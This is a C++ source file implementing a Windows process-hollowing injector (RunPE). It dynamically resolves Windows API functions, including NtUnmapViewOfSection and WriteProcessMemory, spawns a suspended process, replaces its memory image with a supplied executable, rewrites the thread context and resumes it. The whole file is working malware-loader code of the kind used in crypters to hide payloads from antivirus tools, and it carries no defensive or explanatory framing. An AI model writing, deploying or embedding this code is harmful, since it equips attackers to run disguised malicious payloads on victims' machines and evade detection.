#include "Injector.h"

// CP = CreateProcess
typedef BOOL(WINAPI *CP)(
	_In_opt_    LPCTSTR               lpApplicationName,
	_Inout_opt_ LPTSTR                lpCommandLine,
	_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_        BOOL                  bInheritHandles,
	_In_        DWORD                 dwCreationFlags,
	_In_opt_    LPVOID                lpEnvironment,
	_In_opt_    LPCTSTR               lpCurrentDirectory,
	_In_        LPSTARTUPINFO         lpStartupInfo,
	_Out_       LPPROCESS_INFORMATION lpProcessInformation
	);

// WPM = WriteProcessMemory
typedef BOOL(WINAPI *WPM)(
	_In_  HANDLE  hProcess,
	_In_  LPVOID  lpBaseAddress,
	_In_  LPCVOID lpBuffer,
	_In_  SIZE_T  nSize,
	_Out_ SIZE_T  *lpNumberOfBytesWritten
	);

// RPM = ReadProcessMemory
typedef BOOL(WINAPI *RPM)(
	_In_  HANDLE  hProcess,
	_In_  LPCVOID lpBaseAddress,
	_Out_ LPVOID  lpBuffer,
	_In_  SIZE_T  nSize,
	_Out_ SIZE_T  *lpNumberOfBytesRead
	);

// UVOS = (Nt)UnmapViewOfSection
typedef long (WINAPI *UVOS)(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	);

// VAX = VirtualAllocEx
typedef void *(WINAPI *VAX)(
	_In_     HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_     SIZE_T dwSize,
	_In_     DWORD  flAllocationType,
	_In_     DWORD  flProtect
	);

// GTC = GetThreadContext
typedef BOOL(WINAPI *GTC)(
	_In_    HANDLE    hThread,
	_Inout_ LPCONTEXT lpContext
	);

// STC = SetThreadContext
typedef BOOL(WINAPI *STC)(
	_In_       HANDLE  hThread,
	_In_ const CONTEXT *lpContext
	);

// RT = ResumeThread
typedef DWORD(WINAPI *RT)(
	_In_ HANDLE hThread
	);


Injector::Injector()
{
	//
}


Injector::~Injector()
{
	//
}

unsigned char *Injector::ReadFileBytes(const TCHAR *name)
{
	HANDLE hFile = CreateFile(name, GENERIC_READ, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD read = 0;
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	unsigned char *lpBuffer = new unsigned char[dwFileSize];
	ReadFile(hFile, lpBuffer, dwFileSize, &read, NULL);

	CloseHandle(hFile);

	return lpBuffer;
}


void Injector::Inject(LPBYTE lpBuffer) const
{
	PIMAGE_DOS_HEADER idh;
	PIMAGE_NT_HEADERS inh;
	PIMAGE_SECTION_HEADER ish;

	CONTEXT ctc;

	// Load the necessary functions from their libraries. A pointer to the function needed is returned.
	UVOS UVS = reinterpret_cast<UVOS>(LoadFunction(L"ntdll.dll", "NtUnmapViewOfSection"));
	WPM WM = reinterpret_cast<WPM>(LoadFunction(L"kernel32.dll", "WriteProcessMemory"));
	VAX VA = reinterpret_cast<VAX>(LoadFunction(L"kernel32.dll", "VirtualAllocEx"));
	GTC GC = reinterpret_cast<GTC>(LoadFunction(L"kernel32.dll", "GetThreadContext"));
	STC SC = reinterpret_cast<STC>(LoadFunction(L"kernel32.dll", "SetThreadContext"));
	RT R = reinterpret_cast<RT>(LoadFunction(L"kernel32.dll", "ResumeThread"));

	// Get the DOS and NT headers from the byte array representation of the PE.
	idh = reinterpret_cast<PIMAGE_DOS_HEADER>(lpBuffer);
	inh = reinterpret_cast<PIMAGE_NT_HEADERS>(lpBuffer + idh->e_lfanew);

	// Start our target executable in suspended form
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(STARTUPINFO);

	PROCESS_INFORMATION pi;
	pi = *CreateNewProcess(0, L"", &si, &pi);

	// Clear it's virtual memory and map our new executable within its process space
	UVS(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase));
	VA(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase), inh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WM(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase), reinterpret_cast<LPCVOID>(lpBuffer), inh->OptionalHeader.SizeOfHeaders, 0);

	// Write the PE sections
	for (int x = 0; x < inh->FileHeader.NumberOfSections; x++)
	{
		ish = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD>(lpBuffer) + idh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (x * 40));
		WM(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase + ish->VirtualAddress), reinterpret_cast<LPCVOID*>(lpBuffer + ish->PointerToRawData), ish->SizeOfRawData, 0);
	}

	// Resume the process, which now contains our own executable in its memory space
	ctc.ContextFlags = CONTEXT_FULL;
	GC(pi.hThread, &ctc);
	WM(pi.hProcess, reinterpret_cast<void*>(ctc.Ebx + 8), reinterpret_cast<LPVOID>(&inh->OptionalHeader.ImageBase), 4, 0);
	ctc.Eax = inh->OptionalHeader.ImageBase + inh->OptionalHeader.AddressOfEntryPoint;
	SC(pi.hThread, &ctc);
	R(pi.hThread);
}


long Injector::LoadFunction(const TCHAR *szLib, char *szMod) const
{
	HMODULE hFunc = GetModuleHandle(szLib);
	return reinterpret_cast<long>(GetProcAddress(hFunc, szMod));
}

PROCESS_INFORMATION *Injector::CreateNewProcess(DWORD id, TCHAR *szArgs, STARTUPINFO *si, PROCESS_INFORMATION *pi) const
{

	CP C = reinterpret_cast<CP>(LoadFunction(L"kernel32.dll", "CreateProcessW"));	
	TCHAR szCurrentPath[MAX_PATH];
	HMODULE hCurrentModule = GetModuleHandle(nullptr);

	if (hCurrentModule != nullptr)
		GetModuleFileName(hCurrentModule, szCurrentPath, sizeof(szCurrentPath));

	C(szCurrentPath, L"", nullptr, nullptr, false, 0x4, nullptr, nullptr, si, pi);
	return pi;

}
